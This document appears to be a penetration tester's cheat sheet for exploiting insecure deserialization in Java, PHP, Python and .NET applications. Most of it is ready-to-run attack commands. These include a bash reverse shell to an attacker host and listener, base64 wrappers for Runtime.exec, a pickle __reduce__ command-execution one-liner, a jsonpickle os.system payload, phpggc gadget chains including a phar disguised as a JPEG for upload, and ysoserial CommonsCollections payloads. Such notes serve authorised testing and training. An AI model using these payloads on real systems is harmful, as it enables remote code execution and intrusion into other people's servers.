# Deserialization

## Spot it
A cookie, hidden field or parameter that decodes to an object:
echo 'THE-COOKIE' | base64 -d | xxd | head
- [ ] rO0AB in base64, or ac ed 00 05 in hex: Java
- [ ] O:4:"User": or a:2:{ : PHP serialize()
- [ ] gASV or gAJ in base64: Python pickle
- [ ] "py/object" in decoded JSON: Python jsonpickle
- [ ] AAEAAAD///// in base64: .NET BinaryFormatter; __VIEWSTATE in a form: ASP.NET
- [ ] How the app wraps it: base64, URL-encoding or both, matched exactly, since a wrong wrapper fails silently

## Prove it with a ping first
sudo tcpdump -i tun0 icmp
- [ ] Two pings from the target: then the same payload with a shell in place of the ping
The shell, base64-encoded so it survives any quoting:
echo -n 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' | base64 -w 0
In place of the ping, where a shell runs it, as with os.system() and PHP's system():
echo THE-BASE64|base64 -d|bash
Where there is no shell, as with Java's Runtime.exec():
bash -c {echo,THE-BASE64}|{base64,-d}|bash
rlwrap nc -lvnp <LPORT>

## Python: jsonpickle
echo -n '{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["ping -c 2 <LHOST>"],0,0,0]}' | base64 -w 0

## Python: pickle
python3 -c 'import pickle,base64,os; P=type("P",(),{"__reduce__":lambda s:(os.system,("ping -c 2 <LHOST>",))}); print(base64.b64encode(pickle.dumps(P())).decode())'
- [ ] Built on Kali this calls posix.system: for a Windows target, build it on Windows

## PHP: phpggc
Chains for the framework or library the app uses:
phpggc -l
phpggc -l laravel
phpggc -l monolog
A serialized string, base64-encoded, for an unserialize() sink:
phpggc -b monolog/rce1 system 'ping -c 2 <LHOST>'
A phar disguised as a JPEG, for an upload and a phar:// sink, with dummy.jpg any real JPEG:
phpggc -pj dummy.jpg -o avatar.phar.jpg monolog/rce1 system 'ping -c 2 <LHOST>'
- [ ] avatar.phar.jpg uploaded, then a file function reached with phar://THE-UPLOAD-PATH, such as a file_exists() on a path I set
- [ ] Not installed: sudo apt install phpggc

## Java: ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
- [ ] Chains match the libraries on the classpath: error messages, WEB-INF/lib, framework versions
URLDNS needs no library at all. With THE-DNS-NAME a name whose lookups I can see, such as from interactsh:
java -jar ysoserial-all.jar URLDNS 'http://THE-DNS-NAME/' | base64 -w 0
java -jar ysoserial-all.jar CommonsCollections6 'ping -c 2 <LHOST>' | base64 -w 0
java -jar ysoserial-all.jar CommonsCollections5 'ping -c 2 <LHOST>' | base64 -w 0
- [ ] Runtime.exec() takes no pipes or redirects: the shell goes in as the bash -c {echo,...} line above

## .NET
- [ ] ysoserial.net runs on my Windows machine, not Kali
- [ ] A forged __VIEWSTATE needs the machineKey from web.config: read it through an LFI or XXE first
